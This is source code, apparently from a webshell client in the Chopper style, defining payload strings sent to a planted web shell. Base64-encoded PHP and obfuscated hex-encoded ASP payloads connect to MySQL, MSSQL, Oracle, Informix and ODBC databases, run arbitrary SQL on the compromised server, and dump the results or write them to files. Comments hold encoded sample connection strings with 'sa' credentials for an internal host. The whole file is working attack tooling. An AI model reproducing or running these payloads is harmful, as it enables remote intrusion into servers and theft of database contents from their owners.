		"z4\"]):$_POST[\"z4\"];$t=$m?stripslashes($_POST[\"z5\"]):$_POST[\"z5\"];$l=@odbc_connect(\"$d\",\"$"
		"u\",\"$p\");$q=@odbc_exec($l,\"USE $b;SELECT TOP 1 * FROM $t\");@odbc_fetch_row($q);for ($i=1;$i<=@o"
		"dbc_num_fields($q);$i++){echo(trim(odbc_field_name($q, $i)).\"(\".odbc_field_type($q,$i).\")\".chr(9"
		"));}@odbc_free_result($q);@odbc_close($l);exit(\"|<-\");") + "&z1=";

	szDataColumnsPhpPDO_MYSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$u=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"$d=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
		"$t=$m?stripslashes($_POST[\"z5\"]):$_POST[\"z5\"];"
		"try{$dbh=new PDO(\"mysql:host=$h;dbname=$d\",\"$u\",\"$p\");"
		"foreach($dbh->query(\"SHOW COLUMNS FROM `$t`\") as $r){echo $r[0].\"\\t\";}"
		"$dbh=null;}catch(PDOException $e){echo \"ERROR://\".$e->getMessage();}exit(\"|<-\");") + "&z1=";

	szDataColumnsPhpPDO_MSSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$u=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"$d=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
		"$t=$m?stripslashes($_POST[\"z5\"]):$_POST[\"z5\"];"
		"try{$dbh=new PDO(\"odbc:Driver={SQL Server};Server=$h;Database=$d\",\"$u\",\"$p\");"
		"$r=$dbh->query(\"SELECT TOP 1 * FROM $t\");"
		"$i=0;foreach($r->fetch() as $k=>$v){$i++;if($i%2!=0){echo $k.\"\\t\";}}"
		"$dbh=null;}catch(PDOException $e){echo \"ERROR://\".$e->getMessage();}exit(\"|<-\");") + "&z1=";
	//////////////////////////////////////////////////////////////////////////
	szDataColumnsAspSqlServer =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53493D22223A53657420436F6E6E3D5365727665722E4372656174654"
		"F626A656374282241646F64622E636F6E6E656374696F6E22293A44696D2053493A436F6E6E2E4F70656E202222266264285"
		"265717565737428227A312229292622223A496620457272205468656E3A53493D224552524F523A2F2F2022264572722E446"
		"5736372697074696F6E3A4572722E436C6561723A456C73653A5365742052733D4372656174654F626A656374282241646F6"
		"4622E5265636F726473657422293A52732E6F70656E202222266264285265717565737428227A322229292622222C436F6E6"
		"E2C312C313A496620457272205468656E3A53493D224552524F523A2F2F2022264572722E4465736372697074696F6E3A457"
		"2722E436C6561723A456C73653A446F205768696C6520284E6F742052732E456F66204F522052732E426F66293A53493D534"
		"9265273283029262220282226527328312926222922266368722839293A52732E4D6F76654E6578743A4C6F6F703A52732E4"
		"36C6F73653A456E642049663A5365742052733D4E6F7468696E673A436F6E6E2E436C6F73653A456E642049663A536574204"
		"36F6E6E3D4E6F7468696E673A526573706F6E73652E577269746528534929\"\"\"\")):Response.Write(\"\"\"\"|<-\""
		"\"\"\"):Response.End\"\")\")&z1=";
	//4472697665723D7B53716C205365727665727D3B5365727665723D3137322E31362E31302E34393B44617461626173653D6771745F6A786A643B5569643D73613B5077643D53514C736572766572
	//&z2=555345205B746573745D3B53454C45435420412E5B6E616D655D2C422E5B6E616D655D2046524F4D20737973636F6C756D6E7320412C7379737479706573204220776865726520412E69643D6F626A6563745F6964282774626C5F726261635F75736572272920616E6420412E78747970653D422E7874797065204F5244455220425920412E636F6C6964
	szDataColumnsAsp1 =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53493D22223A46756E6374696F6E20544E286E293A53656C656374204"
		"3617365206E3A4361736520323A544E3D22736D616C6C696E74223A4361736520333A544E3D22696E74223A4361736520343"
		"A544E3D227265616C223A4361736520353A544E3D22666C6F6174223A4361736520363A544E3D226D6F6E6579223A4361736"
		"520373A544E3D226461746574696D65223A436173652031313A544E3D22626974223A436173652031323A544E3D227661726"
		"9616E74223A436173652031363A544E3D2274696E79696E74223A436173652031373A544E3D2274696E79696E74223A43617"
		"3652032303A544E3D22626967696E74223A436173652037323A544E3D22756E69717565223A43617365203132383A544E3D2"
		"262696E617279223A43617365203132393A544E3D2263686172223A43617365203133303A544E3D226E63686172223A43617"
		"365203133313A544E3D226E756D65726963223A43617365203133353A544E3D226461746574696D65223A436173652032303"
		"03A544E3D2276617263686172223A43617365203230313A544E3D2274657874223A43617365203230323A544E3D226E76617"
		"263686172223A43617365203230333A544E3D226E74657874223A43617365203230343A544E3D2276617262696E617279223"
		"A43617365203230353A544E3D22696D616765223A4361736520456C73653A544E3D6E3A456E642053656C6563743A456E642"
		"046756E6374696F6E3A53657420436F6E6E3D5365727665722E4372656174654F626A656374282241646F64622E636F6E6E6"
		"56374696F6E22293A44696D2053493A436F6E6E2E4F70656E202222266264285265717565737428227A312229292622223A4"
		"96620457272205468656E3A53493D224552524F523A2F2F2022264572722E4465736372697074696F6E3A4572722E436C656"
		"1723A456C73653A5365742052733D4372656174654F626A656374282241646F64622E5265636F726473657422293A52732E6"
		"F70656E202222266264285265717565737428227A322229292622222C436F6E6E2C312C313A496620457272205468656E3A5"
		"3493D224552524F523A2F2F2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A466F72206"
		"E3D3020546F2052732E4669656C64732E436F756E742D313A53493D53492652732E4669656C64732E4974656D286E292E4E6"
		"16D65262220282226544E2852732E4669656C64732E4974656D286E292E547970652926222922266368722839293A4E65787"
		"43A52732E436C6F73653A456E642049663A5365742052733D4E6F7468696E673A436F6E6E2E436C6F73653A456E642049663"
		"A53657420436F6E6E3D4E6F7468696E673A526573706F6E73652E577269746528534929\"\"\"\")):Response.Write(\"\""
		"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
	//50726F76696465723D53514C4F4C4544422E313B557365722049443D73613B50617373776F72643D53514C7365727665723B496E697469616C20436174616C6F673D6771745F6A786A643B4461746120536F757263653D3137322E31362E31302E34393B
	//&z2=53454C45435420544F502031202A2046524F4D2074626C5F726261635F75736572
	szDataColumnsAsp2 =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53493D22223A46756E6374696F6E20544E286E293A53656C656374204"
		"3617365206E3A4361736520323A544E3D22736D616C6C696E74223A4361736520333A544E3D22696E74223A4361736520343"
		"A544E3D227265616C223A4361736520353A544E3D22666C6F6174223A4361736520363A544E3D226D6F6E6579223A4361736"
		"520373A544E3D226461746574696D65223A436173652031313A544E3D22626974223A436173652031323A544E3D227661726"
		"9616E74223A436173652031363A544E3D2274696E79696E74223A436173652031373A544E3D2274696E79696E74223A43617"
		"3652032303A544E3D22626967696E74223A436173652037323A544E3D22756E69717565223A43617365203132383A544E3D2"
		"262696E617279223A43617365203132393A544E3D2263686172223A43617365203133303A544E3D226E63686172223A43617"
		"365203133313A544E3D226E756D65726963223A43617365203133353A544E3D226461746574696D65223A436173652032303"
		"03A544E3D2276617263686172223A43617365203230313A544E3D2274657874223A43617365203230323A544E3D226E76617"
		"263686172223A43617365203230333A544E3D226E74657874223A43617365203230343A544E3D2276617262696E617279223"
		"A43617365203230353A544E3D22696D616765223A4361736520456C73653A544E3D6E3A456E642053656C6563743A456E642"
		"046756E6374696F6E3A53657420436F6E6E3D5365727665722E4372656174654F626A656374282241646F64622E636F6E6E6"
		"56374696F6E22293A44696D2053493A436F6E6E2E4F70656E202222266264285265717565737428227A312229292622223A4"
		"96620457272205468656E3A53493D224552524F523A2F2F2022264572722E4465736372697074696F6E3A4572722E436C656"
		"1723A456C73653A5365742052733D4372656174654F626A656374282241646F64622E5265636F726473657422293A52732E6"
		"F70656E202222266264285265717565737428227A322229292622222C436F6E6E2C312C313A496620457272205468656E3A5"
		"3493D224552524F523A2F2F2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A466F72206"
		"E3D3020546F2052732E4669656C64732E436F756E742D313A53493D53492652732E4669656C64732E4974656D286E292E4E6"
		"16D65262220282226544E2852732E4669656C64732E4974656D286E292E547970652926222922266368722839293A4E65787"
		"43A52732E436C6F73653A456E642049663A5365742052733D4E6F7468696E673A436F6E6E2E436C6F73653A456E642049663"
		"A53657420436F6E6E3D4E6F7468696E673A526573706F6E73652E577269746528534929\"\"\"\")):Response.Write(\"\""
		"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
	//z1=50726F76696465723D4D6963726F736F66742E4A65742E4F4C4544422E342E303B4461746120536F757263653D633A5C7777775C64622E6D6462
	//&z2=53454C45435420544F502031202A2046524F4D20536974655461626C65
	//SELECT TOP 1 * FROM SiteTable

	szDataColumnsAspxSqlServer =	Ini_szASPX_POST_DATA + "&z1=";

	szDataColumnsAspx1 =	Ini_szASPX_POST_DATA + "&z1=";

	szDataColumnsAspx2 =	Ini_szASPX_POST_DATA + "&z1=";
	//&z1=UHJvdmlkZXI9TWljcm9zb2Z0LkpldC5PTEVEQi40LjA7RGF0YSBTb3VyY2U9Yzpcd3d3XGRiLm1kYg%3D%3D
	//&z2=U0VMRUNUIFRPUCAxICogRlJPTSBTaXRlVGFibGU%3D

	//////////////////////////////////////////////////////////////////////////												php 执行SQL
	szDataExecPhpMysql =	Ini_szPHP_POST_DATA;

	szDataExecPhpPostgreSQL =	Ini_szPHP_POST_DATA;

	szDataExecPhpMssql =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$usr=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"$dbn=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
		"$sql=base64_decode($_POST[\"z5\"]);"
		"$fle=$m?stripslashes($_POST[\"z6\"]):$_POST[\"z6\"];"
		"$spl=$m?stripslashes($_POST[\"z7\"]):$_POST[\"z7\"];"
		"$spl=empty($spl)?\"\\t|\\t\":$spl;"
		"$F=0;if(!empty($fle)){$F=@fopen($fle,\"w\");}"
		"$T=@mssql_connect($hst,$usr,$pwd);"
		"@mssql_select_db($dbn,$T);"
		"$q=@mssql_query($sql,$T);"
		"$i=0;"
		"while($rs=@mssql_fetch_field($q)){"
		"if($F){fwrite($F,$col.$spl);}else{echo($rs->name.\"\\t|\\t\");}"
		"$i++;}"
		"if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}"
		"while($rs=@mssql_fetch_row($q)){"
		"for($c=0;$c<$i;$c++){"
		"if($F){fwrite($F,trim($rs[$c]).$spl);}else{echo(trim($rs[$c]).\"\\t|\\t\");}}"
		"if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}}"
		"@fclose($F);@mssql_free_result($q);@mssql_close($T);exit(\"|<-\");") + "&z1=";

	szDataExecPhpOracle =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$sid=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$usr=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"$dbn=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
		"$sql=base64_decode($_POST[\"z5\"]);"
		"$fle=$m?stripslashes($_POST[\"z6\"]):$_POST[\"z6\"];"
		"$spl=$m?stripslashes($_POST[\"z7\"]):$_POST[\"z7\"];"
		"$spl=empty($spl)?\"\\t|\\t\":$spl;"
		"$F=0;if(!empty($fle)){$F=@fopen($fle,\"w\");}"
		"$H=@ora_plogon(\"{$usr}@{$sid}\",\"{$pwd}\");"
		"if(!$H){echo(\"ERROR:// Login Failed!\");}else{"
		"$T=@ora_open($H);"
		"@ora_commitoff($H);"
		"$q=@ora_parse($T,\"{$sql}\");"
		"$R=ora_exec($T);"
		"if($R){"
		"$n=ora_numcols($T);"
		"for($i=0;$i<$n;$i++){"
		"if($F){fwrite($F,Ora_ColumnName($T,$i).$spl);}else{echo(Ora_ColumnName($T,$i).\"\\t|\\t\");}"
		"}"
		"if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}"
		"while(ora_fetch($T))"
		"{"
		"for($i=0;$i<$n;$i++){"
		"if($F){fwrite($F,trim(ora_getcolumn($T,$i)).$spl);}else{echo(trim(ora_getcolumn($T,$i)).\"\\t|\\t\");}"
		"}"
		"if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}"
		"}"
		"}else{"
		"echo(\"ErrMsg\\t|\\t\\r\\n\");"
		"}@ora_close($T);}"
		"if($F){@fclose($F);echo 1;}exit(\"|<-\");") + "&z1=";

	szDataExecPhpInformix =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$usr=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"$dbn=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
		"$sql=base64_decode($_POST[\"z5\"]);"
		"$fle=$m?stripslashes($_POST[\"z6\"]):$_POST[\"z6\"];"
		"$spl=$m?stripslashes($_POST[\"z7\"]):$_POST[\"z7\"];"
		"$spl=empty($spl)?\"\\t|\\t\":$spl;"
		"$F=0;if(!empty($fle)){$F=@fopen($fle,\"w\");}"
		"$T=(strlen($usr)>0)?@ifx_connect($hst,$usr,$pwd):@ifx_connect($hst);$q=@ifx_query($sql,$T);"
		"$i=0;"
		"while($rs=@ifx_fetch_row($q)){"
		"if($i==0){for(reset($rs);$C=key($rs);next($rs)){"
		"if($F){fwrite($F,$C.$spl);}else{echo($C.\"\\t|\\t\");}"
		"}"
		"if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}"
		"}"
		"for(reset($rs);$C=key($rs);next($rs)){"
		"if($F){fwrite($F,trim($rs[$C]).$spl);}else{echo(trim($rs[$C]).\"\\t|\\t\");}"
		"}"
		"if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}"
		"$i++;"
		"}@ifx_close($T);"
		"if($F){@fclose($F);echo 1;}exit(\"|<-\");") + "&z1=";

	szDataExecPhpODBC_MSSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$d=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$u=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"$b=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
		"$s=base64_decode($_POST[\"z5\"]);"
		"$fle=$m?stripslashes($_POST[\"z6\"]):$_POST[\"z6\"];"
		"$spl=$m?stripslashes($_POST[\"z7\"]):$_POST[\"z7\"];"
		"$spl=empty($spl)?\"\\t|\\t\":$spl;"
		"$F=0;if(!empty($fle)){$F=@fopen($fle,\"w\");}"
		"$l=@odbc_connect(\"$d\",\"$u\",\"$p\");$q=@odbc_exec($l,\"USE $b;$s\");"
		"if(stripos(substr($s,0,6),\"select\")===false){"
		"echo(\"Result\\t|\\t\\r\\n\");echo(odbc_error()?odbc_errormsg($l):\"Execute Successfully!\");echo(\"\\t|\\t\\r\\n\");"
		"}else{"
		"$n=odbc_num_fields($q);for($j=1;$j<=$n;$j++){"
		"if($F){fwrite($F,trim(odbc_field_name($q,$j)).$spl);}else{echo(trim(odbc_field_name($q,$j)).\"\\t|\\t\");}"
		"}"
		"if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}"
		"while(odbc_fetch_row($q)){for($i=1;$i<=$n;$i++){"
		"if($F){fwrite($F,trim(odbc_result($q,$i)).$spl);}else{echo(trim(odbc_result($q,$i)).\"\\t|\\t\");}"
		"}"
		"if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}"
		"}"
		"}@odbc_free_result($q);@odbc_close($l);if($F){@fclose($F);echo 1;}exit(\"|<-\");") + "&z1=";

	szDataExecPhpPDO_MYSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$u=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"$d=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
		"$s=base64_decode($_POST[\"z5\"]);"
		"$fle=$m?stripslashes($_POST[\"z6\"]):$_POST[\"z6\"];"
		"$spl=$m?stripslashes($_POST[\"z7\"]):$_POST[\"z7\"];"
		"$spl=empty($spl)?\"\\t|\\t\":$spl;"
		"$F=0;if(!empty($fle)){$F=@fopen($fle,\"w\");}"
		"try{$dbh=new PDO(\"mysql:host=$h;dbname=$d\",\"$u\",\"$p\");$i=0;"
		"foreach($dbh->query(\"$s\") as $r){"
		"if($i==0){foreach($r as $k=>$v){$i++;if($i%2!=0){if($F){fwrite($F,$k.$spl);}else{echo($k.\"\\t|\\t\");}}}if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}}"
		"$j=0;foreach($r as $k=>$v){$j++;if($j%2!=0){if($F){fwrite($F,$v.$spl);}else{echo($v.\"\\t|\\t\");}}}"
		"if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}"
		"}$dbh=null;}"
		"catch(PDOException $e){echo \"ERROR://\".$e->getMessage();}"
		"if($F){@fclose($F);echo 1;}exit(\"|<-\");") + "&z1=";

	szDataExecPhpPDO_MSSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$u=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"$d=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
		"$s=base64_decode($_POST[\"z5\"]);"
		"$fle=$m?stripslashes($_POST[\"z6\"]):$_POST[\"z6\"];"
		"$spl=$m?stripslashes($_POST[\"z7\"]):$_POST[\"z7\"];"
		"$spl=empty($spl)?\"\\t|\\t\":$spl;"
		"$F=0;if(!empty($fle)){$F=@fopen($fle,\"w\");}"
		"try{$dbh=new PDO(\"odbc:Driver={SQL Server};Server=$h;Database=$d\",\"$u\",\"$p\");$i=0;"
		"foreach($dbh->query(\"$s\") as $r){"
		"if($i==0){foreach($r as $k=>$v){$i++;if($i%2!=0){if($F){fwrite($F,$k.$spl);}else{echo($k.\"\\t|\\t\");}}}if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}}"
		"$j=0;foreach($r as $k=>$v){$j++;if($j%2!=0){if($F){fwrite($F,$v.$spl);}else{echo($v.\"\\t|\\t\");}}}"
		"if($F){fwrite($F,\"\\r\\n\");}else{echo(\"\\r\\n\");}"
		"}$dbh=null;}"
		"catch(PDOException $e){echo \"ERROR://\".$e->getMessage();}"
		"if($F){@fclose($F);echo 1;}exit(\"|<-\");") + "&z1=";
	//////////////////////////////////////////////////////////////////////////
	szDataExecAspSqlServer =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"%szDataExecAspSqlServer%\"\"\"\")):"
		"Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
	//4472697665723D7B53716C205365727665727D3B5365727665723D3137322E31362E31302E34393B44617461626173653D6771745F6A786A643B5569643D73613B5077643D53514C736572766572
	//&z2=53454C45435420434F554E54282A2920415320434E542046524F4D205B74626C5F726261635F757365725D
	szDataExecAsp1 =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53657420436F6E6E3D5365727665722E4372656174654"
		"F626A656374282241646F64622E636F6E6E656374696F6E22293A436F6E6E2E4F70656E20222226626428526571756573742"
		"8227A312229292622223A44696D20434F2C48442C524E3A434F3D636872283929266368722831323429266368722839293A5"
		"24E3D6368722831332926636872283130293A48443D22526573756C742226434F26524E3A496620457272205468656E3A526"
		"573706F6E73652E5772697465204844264572722E4465736372697074696F6E26434F26524E3A4572722E436C6561723A456"
		"C73653A5365742052733D436F6E6E2E45786563757465282222266264285265717565737428227A32222929262222293A496"
		"620457272205468656E3A526573706F6E73652E5772697465204844264572722E4E756D62657226223A22264572722E44657"
		"36372697074696F6E26434F26524E3A4572722E436C6561723A456C73653A44696D20464E3A464E3D52732E4669656C64732"
		"E436F756E742D313A466F72206E3D3020546F20464E3A526573706F6E73652E57726974652052732E4669656C64732E49746"
		"56D286E292E4E616D6526434F3A4E6578743A526573706F6E73652E577269746520524E3A446F205768696C65204E6F74285"
		"2732E456F66204F722052732E426F66293A466F72206E3D3020546F20464E3A526573706F6E73652E5772697465205273286"
		"E293A526573706F6E73652E577269746520434F3A4E6578743A526573706F6E73652E577269746520524E3A52732E4D6F766"
		"54E6578743A4C6F6F703A456E642049663A5365742052733D4E6F7468696E673A436F6E6E2E436C6F73653A456E642049663"
		"A53657420436F6E6E3D4E6F7468696E673A\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
	//50726F76696465723D53514C4F4C4544422E313B557365722049443D73613B50617373776F72643D53514C7365727665723B496E697469616C20436174616C6F673D6771745F6A786A643B4461746120536F757263653D3137322E31362E31302E34393B
	//&z2=53454C45435420434F554E54282A2920415320434E542046524F4D205B74626C5F726261635F757365725D
	szDataExecAsp2 =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53657420436F6E6E3D5365727665722E4372656174654"
		"F626A656374282241646F64622E636F6E6E656374696F6E22293A436F6E6E2E4F70656E20222226626428526571756573742"
		"8227A312229292622223A44696D20434F2C48442C524E3A434F3D636872283929266368722831323429266368722839293A5"
		"24E3D6368722831332926636872283130293A48443D22526573756C742226434F26524E3A496620457272205468656E3A526"
		"573706F6E73652E5772697465204844264572722E4465736372697074696F6E26434F26524E3A4572722E436C6561723A456"
		"C73653A5365742052733D436F6E6E2E45786563757465282222266264285265717565737428227A32222929262222293A496"
		"620457272205468656E3A526573706F6E73652E5772697465204844264572722E4E756D62657226223A22264572722E44657"
		"36372697074696F6E26434F26524E3A4572722E436C6561723A456C73653A44696D20464E3A464E3D52732E4669656C64732"
		"E436F756E742D313A466F72206E3D3020546F20464E3A526573706F6E73652E57726974652052732E4669656C64732E49746"
		"56D286E292E4E616D6526434F3A4E6578743A526573706F6E73652E577269746520524E3A446F205768696C65204E6F74285"
		"2732E456F66204F722052732E426F66293A466F72206E3D3020546F20464E3A526573706F6E73652E5772697465205273286"
		"E293A526573706F6E73652E577269746520434F3A4E6578743A526573706F6E73652E577269746520524E3A52732E4D6F766"
		"54E6578743A4C6F6F703A456E642049663A5365742052733D4E6F7468696E673A436F6E6E2E436C6F73653A456E642049663"
		"A53657420436F6E6E3D4E6F7468696E673A\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")"
		"\")&z1=";//&z1=50726F76696465723D4D6963726F736F66742E4A65742E4F4C4544422E342E303B4461746120536F757263653D633A5C7777775C64622E6D6462
	//&z2=53454C45435420434F554E54282A2920415320434E542046524F4D205B536974655461626C655D

	szDataExecAspxSqlServer =	Ini_szASPX_POST_DATA + "&z1=";

	szDataExecAspx1 =	Ini_szASPX_POST_DATA + "&z1=";
	//UHJvdmlkZXI9U1FMT0xFREIuMTtVc2VyIElEPXNhO1Bhc3N3b3JkPVNRTHNlcnZlcjtJbml0aWFsIENhdGFsb2c9dGVzdDtEYXRhIFNvdXJjZT0obG9jYWwpOw%3D%3D
	//&z2=U0VMRUNUIENPVU5UKCopIEFTIENOVCBGUk9NIFt0YmxfcmJhY191c2VyXQ%3D%3D
	szDataExecAspx2 =	Ini_szASPX_POST_DATA + "&z1=";
